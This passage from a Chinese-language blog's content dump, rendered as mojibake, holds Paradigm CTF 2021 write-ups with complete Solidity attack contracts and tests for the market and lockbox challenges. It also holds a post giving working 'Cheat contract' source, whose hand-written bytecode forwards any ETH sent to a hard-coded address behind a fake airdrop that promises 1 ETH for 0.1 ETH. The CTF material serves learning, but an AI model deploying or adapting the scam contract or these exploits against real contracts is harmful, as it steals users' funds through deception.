ç®€å•è®¡ç®—éœ€è¦å¦‚ä½•å°†marketçš„balanceæç©º 12345678910// å·²çŸ¥ balance(market) = 50 ether// é€šè¿‡ mintCollectibleFor å‡½æ•°é“¸å¸éœ€è¦è¢«æ”¶å– (1 / 11)çš„æ‰‹ç»­åˆ†// é‚£ä¹ˆåˆ°è´¦æˆ·æ‰‹ä¸­çš„å®é™…åªæœ‰ (10 / 11)/* è®¡åˆ’å–ä¸¤æ¬¡å°†é’±å–å®Œï¼Œè®¾é“¸å¸é‡ä¸ºï¼šxï¼Œ æœ‰ï¼š 50 + x = (10 / 11) * x * 2 åŒ–ç®€å¾—ï¼š (9 / 11) * x = 50 emmmï¼Œå¾ˆä¸å¥½ç®—ï¼Œæˆ‘å–œæ¬¢æ•´æ•°ï¼Œx å– 66ï¼Œåˆ™éœ€è¦ç­‰å¼å³è¾¹ä¸º54ï¼Œ è¿™é‡Œå¯ä»¥é€šè¿‡è‡ªæ¯åˆçº¦å¼ºè¡Œç»™åˆçº¦è½¬é’±ï¼Œè¿™æ ·ä¸€æ¥å°±å¥½ç®—äº†ã€‚*/ ç»¼ä¸Šï¼Œæ”»å‡»æ€è·¯ä¸ºï¼š é€šè¿‡è‡ªæ¯åˆçº¦ï¼Œå¾€marketè½¬4ETHï¼› é€šè¿‡mintCollectibleåˆçº¦è·å–tokenIdï¼ˆè¿™æ ·æ‰å¯ä»¥ä¿®æ”¹metadataéƒ¨åˆ†ï¼‰ï¼Œå¹¶è½¬å…¥66 etherï¼› ä¿®æ”¹é€šè¿‡updateMetadata()ä¿®æ”¹metadataçš„å€¼ï¼Œå†é€šè¿‡CryptoCollectiblesçš„approveå‡½æ•°ç»™marketæˆæƒï¼ˆä¸ºäº†æˆåŠŸæ‰§è¡ŒsellCollectible()å‡½æ•°ï¼‰ è°ƒç”¨sellCollectible()å‡½æ•°ï¼Œå…ˆæ‹¿å‡º60ether è°ƒç”¨updataName(tokenId+2ï¼Œ hacker)ï¼Œæˆä¸ºä»£å¸çš„è¢«æˆæƒè€… è°ƒç”¨CryptoCollectibles.transferFrom(tokenId, market, hacker)ï¼Œå†æ¬¡æˆä¸ºtokenIdçš„æ‰€æœ‰è€… æœ€åæˆæƒmarketï¼Œå†æ¬¡æ‰§è¡ŒsellCollectible()å‡½æ•°å³å¯ã€‚ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869pragma solidity 0.7.0;import &quot;../../../src/Paradigm_CTF_2021/market/Setup.sol&quot;;contract MarketHacker_ &#123; EternalStorageAPI eternalStorage; CryptoCollectibles token; CryptoCollectiblesMarket market; Setup setup; constructor(address _setup) payable &#123; require(msg.value == 4 ether, &quot;You must pay 4 ether&quot;); setup = Setup(_setup); eternalStorage = setup.eternalStorage(); token = setup.token(); market = setup.market(); // å¼ºåˆ¶ç»™marketè½¬é’±ï¼Œä½¿å…¶èƒ½å¤Ÿä¸¤æ¬¡è½¬å®Œ new MarketHelper&#123;value:msg.value&#125;(address(market)); &#125; function pwn() public payable &#123; require(msg.value == 66 ether, &quot;You must pay 66 ether&quot;); // 1. mint tokenId for hacker bytes32 tokenId = market.mintCollectible&#123;value:msg.value&#125;(); // 2. set the metadata for the tokenId eternalStorage.updateMetadata(tokenId, address(this)); // 3. approve the market token.approve(tokenId, address(market)); // 4. sell the token market.sellCollectible(tokenId); // be the token&#x27;s owner beTokenOwner(tokenId); // 8. sell the token again market.sellCollectible(tokenId); // 9. judge is sloved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125; function beTokenOwner(bytes32 tokenId) internal &#123; // 5. be the token&#x27;s approval by updateName // slot tokenId + 2 == the location of approval eternalStorage.updateName( bytes32(uint(tokenId) + uint(2)), bytes32(uint(uint160(address(this)))) ); // 6. be the token&#x27;s owner by transferFrom token.transferFrom(tokenId, address(market), address(this)); // 7. approve the market token.approve(tokenId, address(market)); &#125; receive() external payable &#123;&#125; // must realize !!!&#125;contract MarketHelper &#123; constructor(address market) payable &#123; selfdestruct(payable(market)); &#125;&#125; æ”»å‡»åˆçº¦æµ‹è¯• 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity 0.7.0;pragma experimental ABIEncoderV2;import &quot;forge-std/Test.sol&quot;;import &quot;./MarketHacker_.sol&quot;;contract MarketHacker is Test &#123; Setup setup; MarketHacker_ hacker; function setUp() public &#123; setup = new Setup&#123;value:50 ether&#125;(); hacker = new MarketHacker_&#123;value:4 ether&#125;(address(setup)); &#125; function test_isSolved() external &#123; hacker.pwn&#123;value:66 ether&#125;(); assertEq(setup.isSolved(), true); &#125;&#125; 0x09-lockbox1. request è¿™é“é¢˜è¦æ±‚å°†Entrypointåˆçº¦ä¸­çš„solvedå˜é‡ä¿®æ”¹ä¸ºtrueï¼Œå³è¦æ±‚æˆåŠŸæ‰§è¡ŒEntrypointåˆçº¦ä¸­çš„solveå‡½æ•°ã€‚ 2. analysis åˆ†æEntrypointåˆçº¦å¯çŸ¥ï¼Œè¿™é“é¢˜æ˜¯è¦å°†Entrypoint,Stage1,Stage2,Stage3,Stage4,Stage5ä¸­çš„solveå‡½æ•°å…¨éƒ¨æˆåŠŸæ‰§è¡Œï¼Œè€Œä¸”calldataä¸å˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ä¸€æ¬¡calldataé€šè¿‡æ‰€æœ‰çš„solveã€‚è€Œè°ƒç”¨çš„ç»ˆæ­¢æ¡ä»¶æ˜¯ 1234let next := sload(next_slot)if iszero(next) &#123; return(0, 0)&#125; è¿™å°†ä¼šåœ¨ Stage5 ä¸­æ»¡è¶³ã€‚ åœ¨Stage5ä¸­è§„å®šäº†calldataçš„é•¿åº¦ä¸º 256bytesï¼Œæ‰€ä»¥åªèƒ½åœ¨è§„å®šé•¿åº¦çš„calldataä¸­é€šè¿‡æ‰€æœ‰â€œå…³å¡â€ï¼Œæ…¢æ…¢æ‹¼å‡‘å‡ºcalldataã€‚èµ·å§‹calldataä¸º 123456780000000000000000000000000000000000000000000000000000000000000000 // 0x000000000000000000000000000000000000000000000000000000000000000000 // 0x200000000000000000000000000000000000000000000000000000000000000000 // 0x400000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc00000000000000000000000000000000000000000000000000000000000000000 // 0xe0 æ¥ä¸‹æ¥é€ä¸€è¿‡å…³ï¼Œæ‹¼å‡‘å‡ºcalldata è°ƒç”¨Entrypointä¸­çš„solve(bytes4 guess) è¿™ä¸ªguesså¾ˆå¥½çŒœï¼Œåéšéšæœºæ•°ï¼Œå¯ä»¥æå‰è®¡ç®—ï¼› (guessä»é«˜ä½æˆªå–)ï¼Œæ­¤æ—¶çš„calldataä¸ºï¼š 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]0000000000000000000000000000000000000000000000000000000 // 0x000000000000000000000000000000000000000000000000000000000000000000 // 0x200000000000000000000000000000000000000000000000000000000000000000 // 0x400000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 è°ƒç”¨Stage1ä¸­çš„ solve(uint8 v, bytes32 r, bytes32 s) éœ€è¦æ‹¿åˆ°0x7E5F4552091A69125d5DfCb7b8C2659029395Bdfè´¦æˆ·çš„ç§é’¥ï¼Œå¹¶å¯¹keccak256(&quot;stage1&quot;)è¿›è¡Œç­¾åã€‚ æ³¨æ„ï¼š0x7E5F4552091A69125d5DfCb7b8C2659029395Bdfçš„ç§é’¥å¯ä»¥GoogleæŸ¥åˆ°ï¼Œç§é’¥å°±æ˜¯1ï¼Œéœ€è¦ä½¿ç”¨è¯¥ç§é’¥å¯¹keccak256(â€œstage1â€)è¿›è¡Œç­¾åï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œä¸èƒ½é‡‡ç”¨ä»¥å¤ªåŠçš„ç­¾åæ–¹å¼ï¼ˆå³ï¼Œåœ¨æ¶ˆæ¯å‰åŠ ä¸Š\\x19Ethereum Signed Message:\\n32ï¼Œåœ¨è¿™é‡Œè¸©å‘å¾ˆä¹…ã€‚ã€‚ã€‚ï¼‰ ä½¿ç”¨pythonè„šæœ¬è®¡ç®—vï¼Œrï¼Œs 123456789101112from eth_account import Accountfrom web3 import Web3 messagehash = Web3.keccak(text=&quot;stage1&quot;)print(&quot;message&#x27;s hash&quot;,messagehash.hex())privatekey =&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey) print(&quot;r = &quot;, Web3.to_hex(signMessage.r))print(&quot;s = &quot;, Web3.to_hex(signMessage.s))print(&quot;v = &quot;, Web3.to_hex(signMessage.v))print(&quot;signature = &quot;, Web3.to_hex(signMessage.signature)) æ³¨æ„è¿™é‡Œçš„ uint8 vå‚æ•°ä»4bytesä¹‹åçš„ç¬¬ä¸€ä¸ª32bytesä¸­å–ä½ 1byteï¼Œ råœ¨0x20ï¼Œsåœ¨0x40 æ­¤æ—¶çš„calldataä¸ºï¼š 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000001b // 0x00370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20 =&gt; r35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40 =&gt; s0000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 è°ƒç”¨Stage2ä¸­çš„solve(uint16 a, uint16 b) è¿™é‡Œéœ€è¦ä½¿å¾—aå’Œbç›¸åŠ çš„ç»“æœå‘ç”Ÿä¸Šæº¢ï¼Œç¼–è¯‘å™¨ä¸º0.4ï¼Œæ‰€ä»¥è¦ä½¿å¾—æº¢å‡ºå¾ˆç®€å•ï¼Œå³0x00å2byteså’Œ0x20å2bytesçš„å€¼ç›¸åŠ å‘ç”Ÿæº¢å‡ºå³å¯ï¼Œè¿™è¦æ±‚ a &gt; &#x3D;0xFFFF - 0xDD3B = 0x22CCã€‚ æ‰€ä»¥éœ€è¦ä¿®æ”¹ 0x00 å2bytesçš„å€¼ï¼Œå°†å…¶ä¿®æ”¹ä¸º0x991B æ‰€ä»¥æ­¤æ—¶çš„calldataä¸º 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991b // 0x00370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20 =&gt; r35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40 =&gt; s0000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 è°ƒç”¨Stage3ä¸­çš„solve(uint idx, uint[4] memory keys, uint[4] memory lock) 4.1 è¿™é‡Œè¦æ±‚keys[idx % 4] == lock[idx % 4]ï¼Œæ­¤æ—¶çš„idxçš„å€¼ä¾¿æ˜¯0x00æ‰€åœ¨ä½ç½®çš„å€¼ï¼Œä»¥0x1Bç»“å°¾ï¼Œå¦‚æœå¯¹4å»æ¨¡ï¼Œå–æ¨¡çš„ç»“æœåªèƒ½ç­‰äº3ï¼Œå³idx % 4 = 0ï¼Œè€Œåœ¨Stage5ä¸­çš„solve()é™åˆ¶calldataçš„é•¿åº¦ï¼Œæˆ‘ä»¬çŸ¥é“calldataåé¢å…¨æ˜¯ç”¨0è¡¥é½ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä¼ å…¥çš„calldataä¸­ä¸åŒ…æ‹¬lock[3]ï¼Œé‚£ä¹ˆEVMä¼šä»åé¢çš„ç©ºé—²ä½ç½®å–å€¼ï¼Œä¹Ÿå°±æ˜¯å–é›¶ï¼Œå³lock[3]=0ã€‚æ‰€ä»¥ï¼Œä¸èƒ½è®©vç­‰äº0x1Bï¼Œå¦‚æœè®©vç­‰äº0x1Cçš„è¯ï¼Œ0x1c % 4 = 0ï¼Œé‚£ä¹ˆè¿™ä¸ªlock[0]åœ¨å¯æ§çš„calldataä¸­ã€‚ç»¼ä¸Šå¯çŸ¥ï¼Œæ±‚è§£çš„ç­¾åä¸å¯¹ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°æ±‚å‡ºç­¾åã€‚åœ¨ç°å¦‚ä»Šå¾ˆå¤šçš„å·¥å…·åº“ä¸­ï¼Œæ±‚ç­¾åçš„å‡½æ•°è¢«å°è£…å¥½äº†çš„ï¼Œä½†æ˜¯å¯ä»¥å»ä¿®æ”¹æºç ï¼Œæ›´æ”¹secp256k1ä¸­çš„ä¸´æ—¶å¯†é’¥ï¼Œå¯ä»¥å®ç°ã€‚ 4.2 è¿™é‡Œè¦æ±‚keys[i] &lt; keys[i + 1]ï¼Œç°å¦‚ä»Šçš„key[0] &lt; key[1]å³r &lt; sï¼Œæ‰€ä»¥ç”Ÿæˆçš„ç­¾åè¦æ±‚v=28, r &lt; sã€‚ 4.3 è¿™é‡Œè¦æ±‚(keys[j] - lock[j]) % 2 == 0ï¼Œè¿™é‡Œå¯ä»¥æ ¹æ®keysæ•°ç»„ä¿®æ”¹lockæ•°ç»„çš„å€¼ï¼Œä½¿å…¶çš„å·®ä¸ºäºŒçš„å€æ•°ï¼Œä¸”keys[3]çš„å€¼ä¸€å®šæ˜¯å¶æ•°ã€‚ é€šè¿‡ethereumjsè®¡ç®—å‡ºç¬¦åˆè¦æ±‚çš„signature 1234567Message: stage1Message Hash: b6619a2d9d36a2acecba8e9d99c8444477624a46561077a675900f4af2c42c95Signature: &#123; v: 28, r: &#x27;219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f&#x27;, s: &#x27;64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7&#x27;&#125; æ­¤æ—¶çš„calldataä¸º 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991c // 0x00219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0x20 =&gt; r keys[0]64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7 // 0x40 =&gt; s keys[1]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896 // 0x60 keys[2]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a // 0x80 keys[3]219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0xa0 lock[0]0000000000000000000000000000000000000000000000000000000000000003 // 0xc0 lock[1]00000000000000000000000000000000000000000000000000000000 // 0xe0 lock[2] è°ƒç”¨Stage4ä¸­çš„solve(bytes32[6] choices, uint choice) è¦æ±‚choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)ï¼Œè€Œchoiceçš„å€¼å¯¹åº”lock[1]æ­¤æ—¶lock[1]%6==1ï¼Œå¯ä»¥å°†lock[1]ä¿®æ”¹ä¸º3ï¼Œé‚£ä¹ˆlock[1]%6==3ï¼Œæ‰€ä»¥æ­¤æ—¶çš„calldataä¸º 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991c // 0x00219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0x20 =&gt; r keys[0]64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7 // 0x40 =&gt; s keys[1]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896 // 0x60 keys[2]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a // 0x80 keys[3]219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0xa0 lock[0]0000000000000000000000000000000000000000000000000000000000000003 // 0xc0 lock[1]00000000000000000000000000000000000000000000000000000000 // 0xe0 lock[2] æœ€åè¿˜è¦æ³¨æ„å‡½æ•°è°ƒç”¨çš„æ–¹å¼ï¼Œè¦ä¹ˆé€šè¿‡ethersjså‘é€æŒ‡å®šçš„calldataï¼Œè¦ä¹ˆé€šè¿‡æ±‡ç¼–å‘é€æŒ‡å®šçš„calldataã€‚ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./Interface.sol&quot;;contract LockboxHacker_ &#123; Setup setup; Entrypoint entrypoint; constructor(address _setup) &#123; setup = Setup(_setup); entrypoint = Entrypoint(setup.entrypoint()); &#125; function pwn() public &#123; // 1. calculate guess bytes4 guess = bytes4(blockhash(block.number - 1)); // 2. build calldata bytes memory calldata_ = abi.encodePacked( Entrypoint.solve.selector, // bytes4 abi.encodeWithSignature(&quot;solve(bytes4)&quot;) guess, bytes28(uint224(0x000000000000000000000000000000000000000000000000000991c)), bytes32(0x219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f), bytes32(0x64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7), bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896), bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a), bytes32(0x219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f), bytes32(0x0000000000000000000000000000000000000000000000000000000000000003) ); // 3. call the Entrypoin&#x27;s solve() // ä¸èƒ½ç›´æ¥è°ƒç”¨solve(), å› ä¸ºè¿™æ ·å°±æ²¡æœ‰åé¢çš„calldataäº†ï¼Œæˆ‘ä»¬è¦å‘é€åŸå§‹çš„calldata // è¿™ç§åšæ³•ä¼¼æ›¾ç›¸è¯†ï¼Œæˆ‘è®°å¾—å½“æ—¶æ˜¯ç”¨ethersjsåšçš„ // è¿™é‡Œå€Ÿé‰´æˆ‘åŒå­¦çš„æ–¹æ³•ï¼Œé€šè¿‡å†…è”æ±‡ç¼–æ¥å‘é€åŸå§‹çš„calldata(å¾ˆç‰›çš®) // address(entrypoint).call(calldata_); address point = address(entrypoint); assembly &#123; let size := mload(calldata_) pop(call(gas(), point, 0, add(calldata_,0x20), size, 0, 0)) //å¼¹å‡ºè¿”å›å€¼ &#125; // 4. judge is Solved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125;&#125; æ”»å‡»åˆçº¦æµ‹è¯•ï¼š 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./LockboxHacker_.sol&quot;;contract LockboxHacker is Test &#123; string constant path_SetUp = &quot;out/Setup.sol/Setup.json&quot;; Setup setup; LockboxHacker_ hacker; function setUp() public &#123; setup = Setup(deploy_Setup()); hacker = new LockboxHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn(); assertEq(setup.isSolved(), true); &#125; function deploy_Setup() internal returns (address _setup) &#123; bytes memory setup_bytycode = abi.encodePacked(vm.getCode(path_SetUp)); assembly &#123; _setup := create(0, add(setup_bytycode, 0x20), mload(setup_bytycode)) &#125; &#125;&#125; 0x0a-bank1. request è¿™é¢˜è¦æ±‚å°†bankçš„WETHä»£å¸æç©ºã€‚ 2. analysis è¯¥é¢˜ä¸­èƒ½å‡å°‘WETHä½™é¢çš„å‡½æ•°åªæœ‰&#96;&#96;withdrawToken()å‡½æ•°ï¼Œè€Œæ‰§è¡Œçš„é€»è¾‘ä¸ºï¼šé¦–å…ˆå¾—æœ‰è¶³å¤Ÿçš„é’±ï¼Œæ‰å¯ä»¥ä»bankä¸­å–å‡ºï¼Œæ‰€ä»¥æœ¬é¢˜çš„çš„æ¼æ´å¯ä»¥æ˜¯é€šè¿‡è¯¥å‡½æ•°éª—bankçš„é’±ã€‚é—®é¢˜è¿›è€Œè½¬å˜ä¸ºå¦‚ä½•ä½¿å¾—mapping(address &#x3D;&gt; uint) balances&#96;è¯¥æ˜ å°„çš„å€¼å¤§äºè‡ªå·±å®é™…çš„å­˜å‚¨é‡‘é¢ã€‚ çœ‹åˆ°ç»“æ„ä½“ä¸”åœ¨ä½ç‰ˆæœ¬ä¸­ï¼Œæˆ‘é¦–å…ˆæƒ³åˆ°çš„æ˜¯åˆ©ç”¨ç»“æ„ä½“çš„æ’æ§½è¦†ç›–ï¼Œåˆ†æäº†ä¸‹è¯¥æ–¹æ³•ä¸å¯è¡Œï¼Œå› ä¸ºAccount storage accountéƒ½æ˜¯ä»æ˜ å°„accountsä¸­å–å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå­˜åœ¨æ’æ§½è¦†ç›–ã€‚ çœ‹åˆ°æœ¬é¢˜æ¶‰åŠäº†åŠ¨æ€æ•°ç»„ï¼Œä¸”setAccountName(uint accountId, string name)å‡½æ•°æ˜¯ä¸€ä¸ªä¿®æ”¹åŠ¨æ€æ•°ç»„ä»»æ„ç´¢å¼•ä½ç½®çš„å€¼çš„å‡½æ•°ã€‚æ‰€ä»¥å¯ä»¥æƒ³åŠæ³•ä½¿accountsæ•°ç»„çš„é•¿åº¦å˜ä¸ºtype(uint256)ï¼Œåˆ†æå¯çŸ¥withdrawToken()å’ŒcloseLastAccount()å‡½æ•°éƒ½æ¶‰åŠäº†æ•°ç»„é•¿åº¦ä¿®æ”¹çš„æ“ä½œï¼Œä½†æ˜¯åœ¨withdrawToken()ä¸­tokenæ˜¯è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå‡½æ•°çš„å¤–éƒ¨è°ƒç”¨ï¼Œçœ‹åˆ°å¦‚ä¸‹ä»£ç  123456789101112131415function withdrawToken(uint accountId, address token, uint amount) external &#123; require(accountId &lt; accounts[msg.sender].length, &quot;withdrawToken/bad-account&quot;); require(ERC20Like(token).balanceOf(address(this)) &gt;= amount, &quot;withdrawToken/low-sender-balance&quot;); // if the user has emptied their balance, decrement the number of unique tokens if (account.balances[token] == 0) &#123; account.uniqueTokens--; if (account.uniqueTokens == 0 &amp;&amp; accountId == lastAccount) &#123; accounts[msg.sender].length--; &#125; &#125; &#125; ä»”ç»†çœ‹è¿™å°±æ˜¯å¾ˆæ˜æ˜¾çš„é‡å…¥ï¼Œå…ˆåˆ¤æ–­æ•°ç»„é•¿åº¦ï¼Œæ‰§è¡Œå¤–éƒ¨è°ƒç”¨ï¼Œæœ€ååœ¨æ›´æ–°æ•°ç»„çš„é•¿åº¦ï¼Œè¿™é‡Œå®Œå…¨å¯ä»¥åœ¨æ‰§è¡Œå¤–éƒ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™è°ƒç”¨withdrawToken()å‡½æ•°ï¼Œä»è€Œå¯ä»¥é€šè¿‡&#96;&#96;require(accountId &lt; accounts[msg.sender].length, â€œwithdrawToken&#x2F;bad-accountâ€);&#96;æ–­è¨€ã€‚ è¿™ä¸ªbalanceOfçš„é‡å…¥æœ‰ç‚¹éš¾ã€‚ã€‚ã€‚ç›´æ¥å€Ÿé‰´å¤§ä½¬çš„ï¼šé“¾æ¥ å°†æ•°ç»„çš„é•¿åº¦è®¾ç½®ä¸ºtype(uint256)ä¹‹åï¼Œæ¥ä¸‹æ¥è€ƒè™‘çš„æ˜¯è¦†ç›–ã€‚ 12345678// æ‰¾åˆ°`accounts`çš„ä½ç½®accounts_slot = keccak256(abi.encode(msg.sender,0x02));// æ‰¾åˆ°`Account[accountId]`çš„ä½ç½®account_slot = keccak256(abi.encodePacked(accounts_slot)) + 3 * accountId;// æ‰¾åˆ°ç¬¬nä¸ªAccount.balancesæ’æ§½çš„ä½ç½®balances_slot = account_slot + 3 * accountId + 2;// æ‰¾åˆ°ç¬¬nä¸ªAccountçš„WETHå¯¹åº”çš„ä½™é¢weth_slot = keccak256(abi.encode(address(WETH), balances_slot)) å°±æåº¦å¤æ‚ã€‚ã€‚ã€‚ã€‚ã€‚ 3. solveæ”»å‡»åˆçº¦ 1// å…ˆç•™ç€å§ ğŸ¤ªå‰©ä¸‹çš„é¢˜ç›®ä»¥åæ°´å¹³ä¸Šæ¥äº†å†æ¥åš~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2021","slug":"CTFS/Paradigm-CTF-2021","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2021/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Cheat contract","slug":"Experience/tips/éª—å­åˆçº¦","date":"2023-10-13T07:47:10.000Z","updated":"2023-10-13T07:47:10.000Z","comments":true,"path":"2023/10/13/Experience/tips/éª—å­åˆçº¦/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/13/Experience/tips/%E9%AA%97%E5%AD%90%E5%90%88%E7%BA%A6/","excerpt":"","text":"ç®€ä»‹ è¿™æ˜¯ä¸€ä¸ªè›®æœ‰æ„æ€çš„éª—å­åˆçº¦ï¼Œåªè¦å¯¹å¤–å®£ç§°åªéœ€è¦æ”¯ä»˜å¤§äº0.1ETHï¼Œä¾¿å¯ä»¥å¾—åˆ°1ETHï¼Œæ˜¯ä½ ï¼Œä½ ä¼šä¸ä¼šä¿¡ğŸ¤ª éª—å­åˆçº¦1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.16;contract Cheat &#123; /* runtimeCode =&gt; address(cheat).call&#123;value:address(this).balance&#125;(&quot;&quot;); call(g, a, v, in, insize, out, outsize); PUSH1 00 6000 PUSH1 00 6000 PUSH1 00 6000 PUSH1 00 6000 SELFBALANCE 47 PUSH20 Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb2 73Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb2 GAS 5A 5A CALL F1 */ constructor() &#123; bytes memory runtimeCode = hex&quot;60006000600060004773Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb25AF1&quot;; assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125; // ç©ºæŠ• function airDrop() external payable &#123; require(msg.value &gt;= 0.1 ether, &quot;You only need pay 0.1 ether, than you can get 1 ether!!!!&quot;); payable(msg.sender).call&#123;value:1 ether&#125;(&quot;&quot;); &#125;&#125; æ¼”ç¤º é¦–å…ˆcheatå°†åˆçº¦éƒ¨ç½²å¥½ï¼Œå¹¶å‘å¸ƒåˆ°ç½‘ä¸Š å‡ä»¥æ—¶æ—¥ï¼Œä¸€ä¸ªé“ä»”å‘ç°äº†è¿™ä¸ªairdropè¿™ä¸ªç©ºæŠ•ï¼Œå¿ƒé‡Œæƒ³ç€0.1ETHæ¢1WETHè¡€èµšï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•° ç»“æœå‘ç°è‡ªå·±çš„è´¦æˆ·å¹¶æ²¡æœ‰æ”¶åˆ°ç©ºæŠ•ï¼Œcheatçš„è´¦æˆ·åè€Œå¢åŠ äº† 0.1 ether","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"}],"tags":[{"name":"tips","slug":"tips","permalink":"https://biyouqiuqiu.com/tags/tips/"}]},{"title":"CBSC-2022","slug":"CTFS/CBSC-2022/CBSC-2022","date":"2023-10-11T08:50:10.000Z","updated":"2023-10-11T08:50:10.000Z","comments":true,"path":"2023/10/11/CTFS/CBSC-2022/CBSC-2022/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/11/CTFS/CBSC-2022/CBSC-2022/","excerpt":"","text":"å¼•è¨€ ğŸ“Œ ä»£ç å¤ªå¤šäº†,å¯ä»¥åœ¨GitHubæ‰¾åˆ°:é“¾æ¥ 0x00-TrusterLenderPool1. question ğŸ“Œ æç©ºpoolä¸­çš„token0ä»£å¸ï¼ŒæˆåŠŸæ‰§è¡ŒComplete()å‡½æ•°ã€‚ 2. analysis 